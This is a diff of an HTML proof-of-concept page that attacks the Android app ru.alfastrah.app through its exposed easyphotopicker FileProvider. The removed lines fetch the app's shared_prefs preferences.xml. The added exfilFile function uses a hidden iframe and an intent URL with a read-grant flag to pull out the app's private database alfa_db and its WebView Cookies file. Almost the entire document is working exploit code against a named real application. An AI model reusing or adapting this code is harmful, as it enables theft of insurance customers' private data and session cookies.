@@ -1,13 +1,27 @@
 <html>
 <body>
-<pre id="out">Loading...</pre>
-<script>
-fetch('content://ru.alfastrah.app.easyphotopicker.fileprovider/root/data/data/ru.alfastrah.app/shared_prefs/preferences.xml')
-.then(r => r.text())
-.then(t => {
-  document.getElementById('out').innerText = 'SUCCESS:\n' + t;
-})
-.catch(e => document.getElementById('out').innerText = 'BLOCKED: ' + e);
-</script>
+<pre id="out">Loading 3...</pre>
+<script>                                                                                                                                                                                                                                                
+  function exfilFile(contentUri, filename) {                                                                                                              
+    var iframe = document.createElement('iframe');                                                                                                        
+    iframe.style.display = 'none';                                                                                                                        
+    iframe.src = "intent:#Intent;action=android.intent.action.VIEW;data=" +                                                                               
+      encodeURIComponent(contentUri) +                                                                                                                    
+      ";type=application/octet-stream;launchFlags=0x1;package=com.android.chrome;end";                                                                    
+    document.body.appendChild(iframe);
+  }                                                                                                                                                       
+                                                                                                                                  
+  exfilFile(
+    "content://ru.alfastrah.app.easyphotopicker.fileprovider/root/data/data/ru.alfastrah.app/databases/alfa_db",                                          
+    "alfa_db"     
+  );                                                                                                                                                      
+                                                                                                                                               
+  setTimeout(function() {
+    exfilFile(                                                                                                                                            
+      "content://ru.alfastrah.app.easyphotopicker.fileprovider/root/data/data/ru.alfastrah.app/app_webview/Default/Cookies",
+      "cookies"                                                                                                                                           
+    );
+  }, 1000);                                                                                                                                               
+</script>       
 </body>
 </html>
